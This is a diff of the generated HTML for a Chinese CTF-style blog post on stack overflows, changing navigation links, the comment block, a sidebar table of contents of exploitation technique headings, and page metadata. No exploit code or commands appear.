+          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>pwndbg/pwntools</p>
+          <p class='content'>pwndbg&#x2F;gdb的使用X的使用x 是 examine 的缩写
+n 表示要显示的内存单元的个数
+u 表示一个地址单元的长度：
+b 表示单字节h 表示双字节w 表示四字节g 表示八字节...</p>
+        </a>
+      
+      
+        <a class='next' href='/2022/07/05/armpwn%E5%85%A5%E9%97%A8/'>
+          <p class='title'>armpwn入门<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>调试
+
+常用命令info functions ：显示程序的使用的函数
+disassemble 函数名 ：反汇编指定函数
+
+查看内存命令x&#x2F;&lt;n&#x2F;f&#x2F;u&gt;...</p>
+        </a>
+      
+    </div>
+  
+  <!-- Custom Files postEnd begin-->
+  
+  <!-- Custom Files postEnd end-->
+</article>
+
+
   
 
 
+  <article class="post white-box shadow floatable" id="comments">
+    <span hidden>
+      <meta itemprop="discussionUrl" content="/2022/07/06/%E6%A0%88%E6%BA%A2%E5%87%BA/index.html#comments">
+    </span>
+    <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
-  
+
+    <div id="layoutHelper-comments"></div>
+
+  </article>
+
+
+
+
+
+
 </div>
 <aside id='l_side' itemscope itemtype="http://schema.org/WPSideBar">
   
@@ -2620,187 +2940,38 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
 
-<section class="widget blogger shadow floatable desktop mobile pjax">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202205242009843.jpg# https://fastly.jsdelivr.net/gh/volantis-x/cdn-org/blog/Logo-NavBar@3x.png'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-          <h2>1ens</h2>
-        
-        
-          <p>躺平</p>
 
-        
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="https://github.com/1ens/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="mailto:2585801236"
-              class="social fab fa-qq flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="mailto:2585801236@qq.com"
-              class="social fas fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
 
-  
-
-  
-
-  
-    
-    
-  
-
-  <section class="widget category shadow floatable desktop pjax">
+  <section class="widget toc-wrapper shadow floatable desktop mobile pjax" id="toc-div" >
     
   <header>
     
-      <a href='/blog/categories/'><i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
     
   </header>
 
 
     <div class='content'>
-      <ul class="entry navigation">
-        
-          <li><a class="flat-box"
-            title="/categories/WP/" href="/categories/WP/"
-            active-action="action-categoriesWP"
-            ><div class='name'>WP</div><div class='badge'>(8)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/iot/" href="/categories/iot/"
-            active-action="action-categoriesiot"
-            ><div class='name'>iot</div><div class='badge'>(3)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/pwn/" href="/categories/pwn/"
-            active-action="action-categoriespwn"
-            ><div class='name'>pwn</div><div class='badge'>(3)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/%E6%9D%82%E8%B0%88/" href="/categories/%E6%9D%82%E8%B0%88/"
-            active-action="action-categoriesE69D82E8B088"
-            ><div class='name'>杂谈</div><div class='badge'>(2)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/%E7%AE%97%E6%B3%95/" href="/categories/%E7%AE%97%E6%B3%95/"
-            active-action="action-categoriesE7AE97E6B395"
-            ><div class='name'>算法</div><div class='badge'>(2)</div></a></li>
-        
-      </ul>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2syscall"><span class="toc-text">ret2syscall</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%EF%BC%88CTFwiki%EF%BC%89%EF%BC%9A"><span class="toc-text">例（CTFwiki）：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc"><span class="toc-text">ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B1%EF%BC%9A"><span class="toc-text">例1：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B2"><span class="toc-text">例2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2dl"><span class="toc-text">ret2dl</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A"><span class="toc-text">例题：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BB%E8%B4%A5cancary"><span class="toc-text">击败cancary</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-text">基本原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-text">绕过方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-1"><span class="toc-text">例题：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PIE%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-text">PIE绕过：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-text">例题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-2"><span class="toc-text">例题：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%EF%BC%9A"><span class="toc-text">整数溢出：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-3"><span class="toc-text">例题：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%EF%BC%9A"><span class="toc-text">栈迁移：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-4"><span class="toc-text">例题：</span></a></li></ol>
     </div>
   </section>
-
-
-  
-
-  
-    
-    
-  
-
-  <section class="widget tagcloud shadow floatable desktop mobile pjax">
-    
-  <header>
-    
-      <a href='/blog/tags/'><i class="fa-solid fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <a href="/tags/CEF/" style="font-size: 14px; color: #999">-CEF</a> <a href="/tags/ACTF-dropper/" style="font-size: 14px; color: #999">-[ACTF] -[dropper]</a> <a href="/tags/wer/" style="font-size: 14px; color: #999">-[wer]</a> <a href="/tags/luajit/" style="font-size: 14px; color: #999">-luajit</a> <a href="/tags/%E5%8A%A0%E8%A7%A3%E5%AF%86/" style="font-size: 14px; color: #999">-加解密</a> <a href="/tags/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/" style="font-size: 14px; color: #999">TLS回调函数</a> <a href="/tags/arm/" style="font-size: 24px; color: #555">arm</a> <a href="/tags/mips/" style="font-size: 14px; color: #999">mips</a> <a href="/tags/%E4%BA%8C%E5%88%86/" style="font-size: 14px; color: #999">二分</a> <a href="/tags/%E5%85%A5%E9%97%A8/" style="font-size: 14px; color: #999">入门</a> <a href="/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/" style="font-size: 14px; color: #999">反调试</a> <a href="/tags/%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/" style="font-size: 14px; color: #999">固件分析</a> <a href="/tags/%E5%B7%AE%E5%88%86/" style="font-size: 14px; color: #999">差分</a> <a href="/tags/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/" style="font-size: 14px; color: #999">异常处理</a> <a href="/tags/%E5%BD%92%E5%B9%B6/" style="font-size: 14px; color: #999">归并</a> <a href="/tags/%E5%BF%AB%E6%8E%92/" style="font-size: 14px; color: #999">快排</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" style="font-size: 14px; color: #999">数据结构</a> <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="font-size: 14px; color: #999">栈溢出</a> <a href="/tags/%E8%A7%A3%E8%AF%AD/" style="font-size: 24px; color: #555">解语</a> <a href="/tags/%E8%BF%9B%E5%88%B6/" style="font-size: 14px; color: #999">进制</a> <a href="/tags/%E8%BF%B7%E5%AE%AB/" style="font-size: 14px; color: #999">迷宫</a>
-    </div>
-  </section>
-
-
-  
-
-  
-    
-    
-
-<section class="widget shadow floatable desktop pjax">
-  
-  <header>
-    
-      <i class="fa-solid fa-award fa-fw" aria-hidden="true"></i><span class='name'>站点信息</span>
-    
-  </header>
-
-
-  <div class='content'>
-    <div class="webinfo">
-      
-        <div class="webinfo-item">
-          <div>文章数目：</div>
-          <div>18 篇</div>
-        </div>
-      
-
-      
-        <div class="webinfo-item">
-          <div>已运行时间：</div>
-          <div id="webinfo-runtime-count"></div>
-        </div>
-      
-
-
-      
-        <div class="webinfo-item">
-          <div>本站总字数：</div>
-          <div>19.6k 字</div>
-        </div>
-      
-
-      
-
-      
-
-      
-    </div>
-  </div>
-</section>
 
   
 
 
 <!-- 没有 pjax 占位会报错 万恶的 pjax -->
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
 
   <div class="pjax">
     <!-- pjax占位 -->
@@ -2825,13 +2996,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </aside>
 
 
+
           <!--此文件用来存放一些不方便取值的变量-->
 <!--思路大概是将值藏到重加载的区域内-->
 
 <pjax>
 <script>
   window.pdata={}
-  pdata.ispage=false;
+  pdata.ispage=true;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -4101,7 +4273,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"1ens's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"1ens","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"a"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"1ens's blog"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/tags/-[wer]/","name":"-[wer]"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"1ens's blog","url":"http://example.com/","keywords":null,"description":"a","author":{"@type":"Person","name":"1ens","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"a"},"publisher":{"@type":"Organization","name":"1ens's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","description":"a","inLanguage":["zh-CN","default"],"mainEntityOfPage":{"@type":"WebPage"},"author":{"@type":"Person","name":"1ens","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"1ens's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"wordCount":0,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"1ens's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"1ens","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"a"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"1ens's blog"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/pwn/","name":"pwn"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/07/06/栈溢出/","name":"栈溢出"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"1ens's blog","url":"http://example.com/","keywords":null,"description":"a","author":{"@type":"Person","name":"1ens","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"a"},"publisher":{"@type":"Organization","name":"1ens's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"栈溢出","description":"a","inLanguage":["zh-CN","default"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/07/06/%E6%A0%88%E6%BA%A2%E5%87%BA/"},"author":{"@type":"Person","name":"1ens","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"1ens's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/07/06/%E6%A0%88%E6%BA%A2%E5%87%BA/","wordCount":0,"datePublished":"2022-07-05T16:00:00.000Z","dateModified":"2022-07-14T08:31:00.199Z","articleSection":"pwn","keywords":"栈溢出","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
